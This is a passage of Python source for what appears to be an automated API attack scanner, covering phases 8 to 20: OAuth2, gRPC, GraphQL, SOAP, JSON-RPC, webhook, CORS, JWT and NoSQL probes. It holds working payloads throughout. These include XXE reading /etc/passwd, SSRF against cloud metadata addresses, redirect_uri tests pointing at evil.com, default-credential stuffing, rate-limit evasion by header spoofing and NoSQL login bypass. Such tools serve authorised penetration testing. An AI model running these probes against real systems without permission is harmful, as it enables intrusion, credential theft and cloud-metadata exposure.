    "/jwks",
    "/oauth/keys",
]

OAUTH2_DEFAULT_CLIENTS = [
    ("client", "secret"),
    ("app", "secret"),
    ("test", "test"),
    ("admin", "admin"),
    ("default", "default"),
    ("web", "web"),
]

CLOUD_METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "file:///etc/passwd",
]


def probe_oauth2(base):
    """
    OAuth2/OIDC attack surface discovery.
    - Discovers authorization server metadata
    - Tests redirect_uri manipulation (open redirect → token theft)
    - Probes scope escalation
    - Checks PKCE enforcement
    - Tries client credential grant with default secrets
    (oauth2-in-action ch13, api-security-in-action ch11)
    """
    findings = []

    # Step 1: Discover OAuth2 metadata endpoints
    print("  Probing OAuth2/OIDC metadata...")
    auth_server = None
    for path in OAUTH2_DISCOVERY_PATHS:
        r = get(base + path)
        if r and r.status_code == 200:
            try:
                meta = r.json()
                if any(k in meta for k in ("issuer", "token_endpoint", "authorization_endpoint", "jwks_uri")):
                    print(f"  [OAUTH2_META] {path}: {list(meta.keys())}")
                    auth_server = meta
                    findings.append({"type": "oauth2_discovery", "path": path,
                                     "keys": list(meta.keys())})
                    # Extract and probe jwks_uri
                    if "jwks_uri" in meta:
                        jr = get(meta["jwks_uri"])
                        if jr and jr.status_code == 200:
                            print(f"  [JWKS] {meta['jwks_uri']}: {jr.text[:200]}")
                            findings.append({"type": "jwks_exposed", "url": meta["jwks_uri"],
                                             "data": jr.text[:300]})
            except Exception:
                pass

    if not auth_server:
        print("  No OAuth2 metadata found")
        return findings

    # Step 2: redirect_uri manipulation on authorization endpoint
    auth_ep = auth_server.get("authorization_endpoint", "")
    if auth_ep:
        evil_uris = [
            "https://evil.com",
            "javascript:alert(1)",
            "http://localhost",
            "//evil.com",
            auth_ep + "/callback",
        ]
        for uri in evil_uris[:2]:
            params = {
                "response_type": "code",
                "client_id": "test",
                "redirect_uri": uri,
                "scope": "openid email profile admin offline_access",
            }
            r = get(auth_ep, params=params)
            if r and r.status_code not in (400, 422):
                print(f"  [OAUTH2_REDIRECT_URI] {uri} not rejected: {r.status_code}")
                findings.append({"type": "redirect_uri_open", "uri": uri,
                                  "status": r.status_code})

    # Step 3: Client credentials grant with defaults
    token_ep = auth_server.get("token_endpoint", "")
    if token_ep:
        for cid, csec in OAUTH2_DEFAULT_CLIENTS:
            r = post(token_ep, data={
                "grant_type": "client_credentials",
                "client_id": cid,
                "client_secret": csec,
                "scope": "openid admin",
            })
            if r and r.status_code == 200:
                try:
                    tok = r.json()
                    if "access_token" in tok:
                        print(f"  [OAUTH2_DEFAULT_CREDS] client={cid}:{csec} issued token!")
                        findings.append({"type": "oauth2_default_client",
                                          "client_id": cid, "token": tok.get("access_token", "")[:40]})
                except Exception:
                    pass

    return findings


# ─── Phase 9: gRPC Enumeration ────────────────────────────────────────────────

GRPC_REFLECTION_PAYLOAD = b"\x00\x00\x00\x00\x02\n\x00"  # ListServices request

def probe_grpc(base):
    """
    gRPC service enumeration via server reflection.
    - Detects gRPC (Content-Type: application/grpc)
    - Tries server reflection to list services and methods
    - Detects gRPC-Web (application/grpc-web)
    (grpc-up-and-running ch6, grpc-microservices-in-go)
    """
    findings = []
    parsed = urlparse(base)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    # Probe gRPC-Web (HTTP/1.1 compatible, no HTTP/2 needed)
    grpc_web_paths = [
        "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
        "/grpc.health.v1.Health/Check",
        "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
    ]

    grpc_headers = {
        "Content-Type": "application/grpc-web+proto",
        "X-Grpc-Web": "1",
        "Accept": "application/grpc-web+proto",
    }

    print(f"  Probing gRPC on {host}:{port}...")
    for path in grpc_web_paths:
        url = base.rstrip("/") + path
        try:
            r = requests.post(url, headers=grpc_headers,
                              data=GRPC_REFLECTION_PAYLOAD, timeout=5,
                              verify=False)
            ct = r.headers.get("content-type", "")
            if "grpc" in ct or r.status_code in (200, 400):
                print(f"  [GRPC_DETECTED] {path}: {r.status_code} ct={ct}")
                findings.append({"type": "grpc_endpoint", "path": path,
                                  "status": r.status_code, "content_type": ct,
                                  "body": r.content[:100].hex()})
        except Exception:
            pass

    # Try standard gRPC reflection paths as REST (some gRPC gateways expose HTTP)
    rest_probe_paths = [
        "/v1/services",
        "/grpc/services",
        "/api/grpc/services",
        "/reflection",
    ]
    for path in rest_probe_paths:
        r = get(base + path)
        if r and r.status_code == 200:
            if "service" in r.text.lower() or "method" in r.text.lower():
                print(f"  [GRPC_REST_GATEWAY] {path}: {r.text[:100]}")
                findings.append({"type": "grpc_rest_gateway", "path": path,
                                  "body": r.text[:200]})

    return findings


# ─── Phase 10: GraphQL Advanced Attacks ──────────────────────────────────────

def probe_graphql_advanced(base):
    """
    Advanced GraphQL attack surface beyond basic introspection.
    - Query batching (array of operations → auth bypass, rate limit bypass)
    - Alias flooding (multiple field names resolving same resource → IDOR/enumeration)
    - Query depth bombing (recursive nesting → DoS)
    - Directive injection (@skip/@include abuse)
    - Field suggestion leakage (typo → "Did you mean X?")
    (graphql-in-action, graphql-best-practices, practical-graphql)
    """
    findings = []
    gql_endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql"]

    for ep_path in gql_endpoints:
        url = base + ep_path

        # Batching attack: send array of queries (some APIs process all, bypassing per-query limits)
        batch_payload = [
            {"query": "{ __typename }"},
            {"query": "{ __schema { types { name } } }"},
            {"query": '{ __type(name: "User") { fields { name type { name } } } }'},
        ]
        r = post(url, json=batch_payload)
        if r and r.status_code == 200 and isinstance(r.json() if r.text.startswith("[") else None, list):
            print(f"  [GQL_BATCH] {ep_path}: batching accepted, {len(r.json())} results")
            findings.append({"type": "graphql_batching", "path": ep_path,
                              "results": len(r.json())})

        # Alias flooding: enumerate IDs via aliases in one query
        alias_query = "{ " + " ".join(
            f'u{i}: user(id: {i}) {{ id email username }}' for i in range(1, 11)
        ) + " }"
        r = post(url, json={"query": alias_query})
        if r and r.status_code == 200:
            data = r.json().get("data", {})
            populated = {k: v for k, v in data.items() if v is not None}
            if populated:
                print(f"  [GQL_ALIAS_FLOOD] {ep_path}: {len(populated)}/10 user aliases resolved")
                findings.append({"type": "graphql_alias_enum", "path": ep_path,
                                  "resolved": list(populated.keys())})

        # Field suggestion leakage: intentional typo → "Did you mean X?"
        typo_query = '{ userr { id } }'
        r = post(url, json={"query": typo_query})
        if r:
            body = r.text
            if "did you mean" in body.lower() or "suggestion" in body.lower():
                suggestions = re.findall(r'"([a-z][a-z0-9_]+)"', body)
                print(f"  [GQL_SUGGESTION] {ep_path}: field suggestions leaked: {suggestions[:5]}")
                findings.append({"type": "graphql_field_suggestion", "path": ep_path,
                                  "suggestions": suggestions[:10]})

        # Depth bombing probe (5 levels)
        depth_query = "{ " + "users { " * 5 + "id " + "} " * 5 + "}"
        r = post(url, json={"query": depth_query})
        if r:
            if r.status_code == 500 or "error" in r.text.lower():
                print(f"  [GQL_DEPTH] {ep_path}: depth limit triggered at 5: {r.status_code}")
                findings.append({"type": "graphql_depth_limit", "path": ep_path,
                                  "depth": 5, "triggered": True})
            else:
                print(f"  [GQL_NO_DEPTH] {ep_path}: no depth limit at 5 levels")
                findings.append({"type": "graphql_no_depth_limit", "path": ep_path})

    return findings


# ─── Phase 11: Rate Limit Bypass ─────────────────────────────────────────────

RATE_BYPASS_IP_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "CF-Connecting-IP",
    "True-Client-IP",
    "Forwarded",
]

FAKE_IPS = [
    "1.1.1.1",
    "8.8.8.8",
    "127.0.0.1",
    "10.0.0.1",
    "192.168.1.1",
    "169.254.169.254",
]


def probe_rate_limit_bypass(base, endpoints):
    """
    Evasion techniques against rate limiting and WAF IP-based controls.
    - IP header spoofing (X-Forwarded-For, X-Real-IP, CF-Connecting-IP)
    - Path variation (trailing slash, case, null byte, double slash)
    - Encoding variation (URL encode chars, double encode)
    (hacking-apis ch13)
    """
    findings = []
    if not endpoints:
        return findings

    ep = endpoints[0]
    url = base + ep.path

    # Baseline rate check
    base_r = get(url)
    if not base_r:
        return findings
    baseline_code = base_r.status_code

    # IP header spoofing: does any header change the response/bypass rate limit?
    for header in RATE_BYPASS_IP_HEADERS:
        for ip in FAKE_IPS[:2]:
            r = get(url, headers={header: ip})
            if r and r.status_code != baseline_code:
                print(f"  [RATE_BYPASS_HEADER] {header}: {ip} → {r.status_code} (was {baseline_code})")
                findings.append({"type": "rate_bypass_ip_header", "header": header,
                                  "ip": ip, "original_code": baseline_code,
                                  "new_code": r.status_code})
            elif r and r.status_code == 200 and baseline_code == 429:
                print(f"  [RATE_BYPASS_SUCCESS] {header}: {ip} bypasses rate limit!")
                findings.append({"type": "rate_limit_bypassed", "header": header, "ip": ip})

    # Path variation bypass
    path_variants = [
        ep.path + "/",
        ep.path + "//",
        ep.path.upper(),
        ep.path + "%20",
        ep.path + "?x=1",
        ep.path.replace("/", "//"),
        ep.path + ";x=1",
        ep.path + "#x",
        "/" + ep.path.lstrip("/").replace("/", "%2f"),
    ]
    for variant in path_variants:
        r = get(base + variant)
        if r and r.status_code != 404 and r.status_code != baseline_code:
            print(f"  [RATE_BYPASS_PATH] {variant}: {r.status_code} (was {baseline_code})")
            findings.append({"type": "rate_bypass_path_variant", "variant": variant,
                              "status": r.status_code})

    return findings


# ─── Phase 12: SOAP/WSDL Discovery ──────────────────────────────────────────

WSDL_PATHS = [
    "/?wsdl", "/service?wsdl", "/api?wsdl", "/ws?wsdl",
    "/_wsdl", "/wsdl", "/soap/wsdl", "/services?wsdl",
    "/api/soap", "/soap", "/xmlrpc", "/rpc",
    "/?disco",  # .NET discovery
]

SOAP_XXE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>"""

SOAP_ACTION_DISCOVERY = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body/>
</soap:Envelope>"""


def probe_wsdl_soap(base):
    """
    SOAP/WSDL endpoint discovery and XXE injection.
    - WSDL file retrieval reveals all operations/types
    - SOAPAction header enumeration
    - XXE in SOAP body (file read, SSRF)
    (pentesting-apis ch5, api-security-for-white-hat-hackers ch4)
    """
    findings = []

    print("  Probing SOAP/WSDL endpoints...")
    for path in WSDL_PATHS:
        r = get(base + path)
        if r and r.status_code == 200:
            ct = r.headers.get("content-type", "")
            body = r.text
            if any(x in body for x in ("wsdl", "WSDL", "<definitions", "<schema", "soap:")):
                print(f"  [WSDL_FOUND] {path}: ct={ct} len={len(body)}")
                # Extract operation names
                ops = re.findall(r'<(?:wsdl:)?operation\s+name=["\']([^"\']+)["\']', body)
                types = re.findall(r'<(?:xs:)?element\s+name=["\']([^"\']+)["\']', body)[:10]
                print(f"    Operations: {ops[:10]}")
                print(f"    Types: {types}")
                findings.append({"type": "wsdl_found", "path": path,
                                  "operations": ops, "types": types, "wsdl": body[:500]})

                # Now try XXE
                r_xxe = post(base.rstrip("/") + path.split("?")[0],
                             data=SOAP_XXE,
                             headers={"Content-Type": "text/xml; charset=utf-8",
                                      "SOAPAction": '""'})
                if r_xxe:
                    if "root:" in r_xxe.text or "/bin" in r_xxe.text:
                        print(f"  [SOAP_XXE_RCE] File read via XXE: {r_xxe.text[:200]}")
                        findings.append({"type": "soap_xxe_file_read", "path": path,
                                          "content": r_xxe.text[:500]})
                    elif r_xxe.status_code != 500:
                        print(f"  [SOAP_XXE_PROBE] {path}: {r_xxe.status_code} {r_xxe.text[:80]}")

            elif "xml" in ct or "soap" in ct.lower():
                print(f"  [SOAP_ENDPOINT] {path}: {r.status_code} ct={ct}")
                findings.append({"type": "soap_endpoint", "path": path,
                                  "content_type": ct})

    return findings


# ─── Phase 13: JSON-RPC Enumeration ──────────────────────────────────────────

JSONRPC_PATHS = [
    "/rpc", "/jsonrpc", "/api/rpc", "/api/jsonrpc",
    "/json-rpc", "/api/json-rpc", "/rpc.php", "/jsonrpc.php",
    "/", "/api", "/api/v1",
]

JSONRPC_INTROSPECT = [
    {"jsonrpc": "2.0", "method": "system.listMethods", "params": [], "id": 1},
    {"jsonrpc": "2.0", "method": "system.describe", "params": [], "id": 2},
    {"jsonrpc": "2.0", "method": "rpc.discover", "params": [], "id": 3},
    {"jsonrpc": "2.0", "method": "help", "params": [], "id": 4},
]


def probe_jsonrpc(base):
    """
    JSON-RPC endpoint detection and method enumeration.
    system.listMethods is a standard introspection call many JSON-RPC
    servers expose. Also probes batch execution and notification handling.
    (pentesting-apis ch1)
    """
    findings = []

    for path in JSONRPC_PATHS:
        url = base + path
        for probe in JSONRPC_INTROSPECT[:2]:
            r = post(url, json=probe)
            if r and r.status_code == 200:
                try:
                    resp = r.json()
                    if "result" in resp and resp["result"] is not None:
                        methods = resp["result"]
                        print(f"  [JSONRPC] {path} system.listMethods: {methods[:10]}")
                        findings.append({"type": "jsonrpc_methods_exposed", "path": path,
                                          "methods": methods[:20] if isinstance(methods, list) else methods})
                    elif "error" in resp:
                        code = resp["error"].get("code", 0)
                        if code != -32601:  # method not found — expected; -32601 = not JSON-RPC
                            print(f"  [JSONRPC_ENDPOINT] {path}: JSON-RPC error {code}")
                            findings.append({"type": "jsonrpc_endpoint", "path": path,
                                              "error_code": code})
                except Exception:
                    pass

        # Batch execution probe
        batch = [
            {"jsonrpc": "2.0", "method": "system.listMethods", "params": [], "id": 1},
            {"jsonrpc": "2.0", "method": "system.describe", "params": [], "id": 2},
        ]
        r = post(url, json=batch)
        if r and r.status_code == 200 and r.text.startswith("["):
            print(f"  [JSONRPC_BATCH] {path}: batching supported")
            findings.append({"type": "jsonrpc_batching", "path": path})

    return findings


# ─── Phase 14: Business Logic Probes ─────────────────────────────────────────

def probe_business_logic(base, endpoints):
    """
    Business logic attack surface: numeric boundaries, sequence breaking,
    negative values, zero, overflow, and type confusion in business fields.
    - Price/amount fields: try 0, -1, 99999999, 0.001, overflow
    - Quantity fields: try 0, -1, overflow
    - Status fields: try privileged state names (admin, approved, verified)
    - Sequence breaking: skip required workflow steps
    (pentesting-apis ch9, hacking-apis ch11)
    """
    findings = []
    numeric_names = {"price", "amount", "cost", "quantity", "qty", "count",
                     "balance", "credit", "total", "score", "limit", "rate", "age"}
    status_names = {"status", "role", "type", "state", "tier", "plan", "level",
                    "verified", "approved", "active", "enabled"}
    privileged_values = ["admin", "administrator", "superuser", "root", "owner",
                         "approved", "verified", "premium", "enterprise", "paid"]
    boundary_values = [0, -1, -100, 99999999, 2147483647, -2147483648,
                       0.001, -0.001, 1e308, "null", "undefined", "NaN", "Infinity"]

    for ep in endpoints:
        url = base + ep.path
        for param, pinfo in ep.params.items():
            if param == "__body__":
                continue
            pname_lower = param.lower()

            # Numeric boundary probing
            if any(n in pname_lower for n in numeric_names):
                for method in ep.methods[:1]:
                    # Sentinel baseline: what does a valid value look like?
                    _bl = req(method, url,
                              json={param: 1} if method in ("POST", "PUT", "PATCH") else None,
                              params={param: 1} if method == "GET" else {})
                    _bl_body = _bl.text.strip() if _bl else None
                    for val in boundary_values[:6]:
                        r = req(method, url,
                                json={param: val} if method in ("POST", "PUT", "PATCH") else None,
                                params={param: val} if method == "GET" else {})
                        if r and r.status_code not in (400, 422, 429):
                            if r.status_code == 200:
                                probe_body = r.text.strip()
                                if _bl_body is not None and probe_body == _bl_body:
                                    continue
                                print(f"  [BIZ_LOGIC_NUMERIC] {method} {ep.path} {param}={val}: 200 accepted")
                                findings.append({"type": "business_logic_numeric",
                                                  "endpoint": f"{method} {ep.path}",
                                                  "param": param, "value": val,
                                                  "status": r.status_code})

            # Status/role privilege escalation
            if any(n in pname_lower for n in status_names):
                for method in ("POST", "PUT", "PATCH"):
                    if method not in ep.methods:
                        continue
                    # Sentinel baseline: garbage value — if server 200s this too, it's not meaningful
                    _bl = req(method, url, json={param: "__sentinel_xyz_12345__"})
                    _bl_code = _bl.status_code if _bl else None
                    _bl_body = _bl.text.strip() if _bl else None
                    for val in privileged_values[:4]:
                        r = req(method, url, json={param: val})
                        if r and r.status_code == 200:
                            probe_body = r.text.strip()
                            if _bl_code == 200 and _bl_body is not None and probe_body == _bl_body:
                                continue
                            print(f"  [BIZ_LOGIC_PRIV] {method} {ep.path} {param}={val}: accepted!")
                            findings.append({"type": "business_logic_privilege",
                                              "endpoint": f"{method} {ep.path}",
                                              "param": param, "value": val})

    return findings


# ─── Phase 15: Webhook SSRF ──────────────────────────────────────────────────

WEBHOOK_PATHS = [
    "/webhook", "/webhooks", "/api/webhook", "/api/webhooks",
    "/notify", "/callback", "/callbacks", "/hook", "/hooks",
    "/api/notify", "/subscribe", "/event", "/events",
]

WEBHOOK_PARAM_NAMES = [
    "url", "webhook_url", "callback_url", "endpoint", "target",
    "notify_url", "redirect_url", "return_url", "hook_url",
    "destination", "callback", "webhook", "report_url",
]


def probe_webhook_ssrf(base, endpoints):
    """
    Webhook endpoint discovery + SSRF via cloud metadata probing.
    Uses baseline comparison: if response to SSRF URL is identical to
    response with a garbage sentinel value, the param is ignored → skip.
    Only reports when response body differs (param is being consumed) OR
    body contains metadata content.
    (defending-apis, api-security-for-white-hat-hackers ch6)
    """
    findings = []
    SENTINEL = "https://definitely-not-real-sentinel-xyz-12345.example.com/"
    METADATA_INDICATORS = ("ami-id", "instance-id", "iam/", "computeMetadata",
                           "google.internal", "alibaba", "169.254.169.254")

    # Discover webhook endpoints
    webhook_candidates = []
    for path in WEBHOOK_PATHS:
        r = get(base + path)
        if r and r.status_code not in (404,):
            print(f"  [WEBHOOK_FOUND] {path}: {r.status_code}")
            webhook_candidates.append(path)
            findings.append({"type": "webhook_endpoint", "path": path,
                              "status": r.status_code})

    all_candidates = list(set(webhook_candidates + [ep.path for ep in endpoints]))

    for path in all_candidates[:10]:
        url = base + path

        for pname in WEBHOOK_PARAM_NAMES:
            # Baseline: garbage sentinel URL — if param is ignored, all probes match this
            baseline = get(url, params={pname: SENTINEL})
            if not baseline:
                continue
            baseline_body = baseline.text.strip()
            baseline_len = len(baseline_body)

            for meta_url in CLOUD_METADATA_URLS[:3]:
                r = get(url, params={pname: meta_url})
                if not r or r.status_code in (400, 404, 422):
                    continue

                body = r.text
                body_lower = body.lower()

                # Hard win: metadata content in response
                if any(x in body_lower for x in METADATA_INDICATORS):
                    print(f"  [WEBHOOK_SSRF_HIT] {path} {pname}={meta_url}: METADATA LEAKED!")
                    findings.append({"type": "webhook_ssrf_metadata", "path": path,
                                      "param": pname, "url": meta_url,
                                      "body": body[:500]})
                    continue

                # Skip if response is identical to sentinel baseline (param ignored)
                probe_body = body.strip()
                if probe_body == baseline_body:
                    continue

                # Skip tiny/null responses that differ only trivially
                if len(probe_body) < 10 and abs(len(probe_body) - baseline_len) < 5:
                    continue

                # Response differed — param was consumed, possible SSRF
                print(f"  [WEBHOOK_SSRF_DIFF] {path} {pname}={meta_url}: response differs from baseline")
                findings.append({"type": "webhook_ssrf_diff", "path": path,
                                  "param": pname, "url": meta_url,
                                  "baseline": baseline_body[:100],
                                  "probe": probe_body[:100]})

            # POST probe — only on discovered webhook endpoints
            if path in webhook_candidates:
                for meta_url in CLOUD_METADATA_URLS[:2]:
                    r = post(url, json={pname: meta_url})
                    if r and any(x in r.text.lower() for x in METADATA_INDICATORS):
                        print(f"  [WEBHOOK_SSRF_POST] {path} POST {pname}={meta_url}: METADATA!")
                        findings.append({"type": "webhook_ssrf_post", "path": path,
                                          "param": pname, "url": meta_url,
                                          "body": r.text[:500]})

    return findings


# ─── Phase 16: Credential Stuffing / Default Auth Probe ──────────────────────

AUTH_ENDPOINT_PATTERNS = [
    "/login", "/auth", "/signin", "/sign-in", "/token",
    "/api/login", "/api/auth", "/api/token", "/api/signin",
    "/api/v1/login", "/api/v1/auth", "/api/v1/token",
    "/oauth/token", "/auth/token", "/users/login", "/user/login",
    "/account/login", "/session", "/sessions",
]

DEFAULT_CRED_PAIRS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("admin", ""),
    ("root", "root"),
    ("root", "password"),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("demo", "demo"),
    ("api", "api"),
    ("service", "service"),
]

USER_FIELDS = [["username", "password"], ["email", "password"],
               ["user", "pass"], ["login", "password"], ["name", "password"]]


def probe_default_creds(base):
    """
    Detect auth endpoints and try default credential pairs.
    Also checks for verbose error messages that enable user enumeration
    (different response for invalid user vs wrong password).
    (hacking-apis ch8)
    """
    findings = []

    # Discover auth endpoints
    auth_endpoints = []
    for path in AUTH_ENDPOINT_PATTERNS:
        r = post(base + path, json={"username": "probe_test_xyz", "password": "probe_test_xyz"})
        if r and r.status_code not in (404,):
            print(f"  [AUTH_EP] {path}: {r.status_code} {r.text[:60]}")
            auth_endpoints.append((path, r))

    if not auth_endpoints:
        print("  No auth endpoints found")
        return findings

    for path, probe_r in auth_endpoints:
        url = base + path
        probe_text = probe_r.text

        # User enumeration: does a valid username give different response?
        for fields in USER_FIELDS[:2]:
            uf, pf = fields
            # Valid username probe (common names)
            for uname in ("admin", "administrator", "root"):
                r_valid = post(url, json={uf: uname, pf: "wrongpassXYZ_not_real"})
                r_invalid = post(url, json={uf: "zzz_not_exist_xyz", pf: "wrongpassXYZ_not_real"})
                if r_valid and r_invalid:
                    if r_valid.status_code != r_invalid.status_code:
                        print(f"  [USER_ENUM] {path}: status differs ({r_valid.status_code} vs {r_invalid.status_code}) for {uname}")
                        findings.append({"type": "user_enumeration", "path": path,
                                          "username": uname, "valid_code": r_valid.status_code,
                                          "invalid_code": r_invalid.status_code})
                    elif r_valid.text != r_invalid.text:
                        print(f"  [USER_ENUM_BODY] {path}: response body differs for {uname}")
                        findings.append({"type": "user_enumeration_body", "path": path,
                                          "username": uname})

            # Try default credentials
            for uname, passwd in DEFAULT_CRED_PAIRS[:8]:
                r = post(url, json={uf: uname, pf: passwd})
                if r and r.status_code == 200:
                    try:
                        data = r.json()
                        if any(k in data for k in ("token", "access_token", "jwt",
                                                     "session", "key", "auth")):
                            print(f"  [DEFAULT_CREDS] {path} {uf}={uname}/{passwd}: AUTH SUCCESS!")
                            findings.append({"type": "default_creds_success",
                                              "path": path, "username": uname,
                                              "password": passwd, "response": data})
                    except Exception:
                        pass
                # Also try form-encoded
                r = post(url, data={uf: uname, pf: passwd})
                if r and r.status_code == 200:
                    if any(x in r.text for x in ("token", "session", "welcome", "dashboard")):
                        print(f"  [DEFAULT_CREDS_FORM] {path} {uf}={uname}/{passwd}: form auth success")
                        findings.append({"type": "default_creds_form",
                                          "path": path, "username": uname, "password": passwd})

    return findings


# ─── Phase 17: CORS Misconfiguration ────────────────────────────────────────

CORS_TEST_ORIGINS = [
    "https://evil.com",
    "null",
    "https://evil.example.com",
    "http://localhost",
    "https://attacker.com",
]


def probe_cors(base, endpoints):
    """
    CORS misconfiguration: origin reflection, null origin bypass, wildcard.
    If Access-Control-Allow-Origin reflects attacker origin AND
    Access-Control-Allow-Credentials: true → cookie/token theft across origins.
    (defending-apis ch7, api-security-in-action ch5)
    """
    findings = []
    test_paths = [ep.path for ep in endpoints[:5]] + ["/", "/api", "/api/v1"]

    for path in test_paths[:6]:
        url = base + path
        for origin in CORS_TEST_ORIGINS[:3]:
            r = get(url, headers={"Origin": origin})
            if not r:
                continue
            acao = r.headers.get("access-control-allow-origin", "")
            acac = r.headers.get("access-control-allow-credentials", "false").lower()
            acam = r.headers.get("access-control-allow-methods", "")

            if acao == "*":
                print(f"  [CORS_WILDCARD] {path}: ACAO=* (no credentials risk, but data exposure)")
                findings.append({"type": "cors_wildcard", "path": path})

            elif acao == origin:
                severity = "CRITICAL" if acac == "true" else "MEDIUM"
                print(f"  [CORS_REFLECT_{severity}] {path}: reflects origin={origin!r} + credentials={acac}")
                findings.append({
                    "type": "cors_reflect", "path": path, "origin": origin,
                    "credentials": acac, "severity": severity, "methods": acam,
                })

            elif "null" in acao and origin == "null":
                print(f"  [CORS_NULL_BYPASS] {path}: null origin accepted + credentials={acac}")
                findings.append({"type": "cors_null", "path": path, "credentials": acac})

    return findings


# ─── Phase 18: JWT Algorithm Confusion (RS256 → HS256) ──────────────────────

def probe_jwt_alg_confusion(base, endpoints):
    """
    JWT algorithm confusion: if server uses RS256, the public key is often
    retrievable. Sign a JWT with HS256 using the RSA public key as HMAC secret.
    Server validates with public key using HMAC → accepts forged token.
    (advanced-api-security ch13, api-security-in-action ch6)
    """
    findings = []
    jwks_paths = ["/.well-known/jwks.json", "/jwks", "/oauth/keys", "/auth/jwks",
                  "/api/auth/jwks", "/.well-known/openid-configuration"]

    for path in jwks_paths:
        r = get(base + path)
        if not r or r.status_code != 200:
            continue
        try:
            data = r.json()
            # OIDC discovery — follow jwks_uri
            if "jwks_uri" in data:
                r = get(data["jwks_uri"])
                if not r:
                    continue
                data = r.json()
            keys = data.get("keys", [])
            for key in keys:
                if key.get("kty") == "RSA":
                    kid = key.get("kid", "unknown")
                    alg = key.get("alg", "RS256")
                    print(f"  [JWT_PUBKEY] RSA public key found at {path}: kid={kid}, alg={alg}")
                    print(f"    n={key.get('n', '')[:40]}...")
                    findings.append({
                        "type": "rsa_public_key_exposed",
                        "path": path,
                        "kid": kid,
                        "alg": alg,
                        "key": {k: v for k, v in key.items() if k in ("n", "e", "kid", "alg")},
                        "attack": "Forge HS256 JWT using public key as HMAC secret (algorithm confusion)",
                    })
        except Exception:
            pass

    # Also probe any JWT we find for RS256/ES256 alg (confusion target)
    jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
    for ep in endpoints[:5]:
        r = get(base + ep.path)
        if not r:
            continue
        tokens = jwt_pattern.findall(r.text + str(r.headers))
        for token in tokens[:2]:
            result = decode_jwt_unsafe(token)
            if not result:
                continue
            header, payload = result
            alg = header.get("alg", "")
            if alg in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512"):
                print(f"  [JWT_ASYM_ALG] {ep.path}: alg={alg} — algorithm confusion candidate")
                findings.append({
                    "type": "jwt_asymmetric_alg",
                    "endpoint": ep.path,
                    "alg": alg,
                    "attack": f"If public key obtainable, sign with HS{alg[2:]} using pubkey as secret",
                })

    return findings


# ─── Phase 19: NoSQL Injection ───────────────────────────────────────────────

NOSQL_PAYLOADS = [
    # MongoDB operator injection (JSON body)
    {"$gt": ""},
    {"$ne": "invalid_xyz_1234"},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$or": [{"a": 1}, {"b": 1}]},
    # Array injection: send value as array
    ["valid_value", {"$gt": ""}],
]

NOSQL_STRING_PAYLOADS = [
    # Query string NoSQL injection
    "[$ne]=1",
    "[gt]=",
    "[regex]=.*",
    "[$where]=1",
    "',$where:'1==1",
]


def probe_nosql_injection(base, endpoints):
    """
    NoSQL injection via MongoDB operator injection.
    JSON body: {field: {"$ne": ""}} bypasses equality check → auth bypass.
    Query string: ?username[$ne]=x or ?field[$regex]=.* enumerates all records.
    (pentesting-apis ch5, hacking-apis ch12)
    """
    findings = []

    for ep in endpoints:
        url = base + ep.path
        for param, pinfo in list(ep.params.items())[:4]:
            if param == "__body__":
                continue
            location = pinfo.get("location", "query")

            # JSON body operator injection
            for payload in NOSQL_PAYLOADS[:4]:
                body = {param: payload}
                for method in ("POST", "PUT", "PATCH"):
                    if method not in ep.methods:
                        continue
                    r = req(method, url, json=body)
                    if not r:
                        continue
                    body_lower = r.text.lower()
                    if r.status_code == 200 and len(r.content) > 100:
                        print(f"  [NOSQL_JSON] {method} {ep.path} {param}={payload}: 200 ({len(r.content)}b)")
                        findings.append({"type": "nosql_operator_inject", "endpoint": f"{method} {ep.path}",
                                          "param": param, "payload": str(payload), "size": len(r.content)})
                    if "objectid" in body_lower or "bsontype" in body_lower:
                        print(f"  [NOSQL_ERROR] MongoDB error leaked: {r.text[:100]}")
                        findings.append({"type": "nosql_error_disclosure", "endpoint": ep.path,
                                          "body": r.text[:200]})

            # Query string operator injection
            for qs_payload in NOSQL_STRING_PAYLOADS[:3]:
                test_param = f"{param}{qs_payload}"
                r = get(url, params={test_param: "x"})
                if r and r.status_code == 200 and len(r.content) > 100:
                    print(f"  [NOSQL_QS] {ep.path}?{param}{qs_payload}: 200 ({len(r.content)}b)")
                    findings.append({"type": "nosql_qs_inject", "endpoint": ep.path,
                                      "payload": qs_payload, "size": len(r.content)})

        # Auth endpoint NoSQL: try login bypass
        if any(x in ep.path for x in ("login", "auth", "signin", "token")):
            bypass_body = {"username": {"$ne": ""}, "password": {"$ne": ""}}
            r = req("POST", url, json=bypass_body)
            if r and r.status_code == 200:
                try:
                    data = r.json()
                    if any(k in data for k in ("token", "access_token", "session", "user")):
                        print(f"  [NOSQL_AUTH_BYPASS] {ep.path}: NoSQL auth bypass! {r.text[:100]}")
                        findings.append({"type": "nosql_auth_bypass", "endpoint": ep.path,
                                          "response": r.text[:300]})
                except Exception:
                    pass

    return findings


# ─── Phase 20: BFLA (Broken Function Level Authorization) ────────────────────

ADMIN_PATHS = [
    "/admin", "/admin/users", "/admin/config", "/admin/stats",
    "/api/admin", "/api/admin/users", "/api/admin/config",
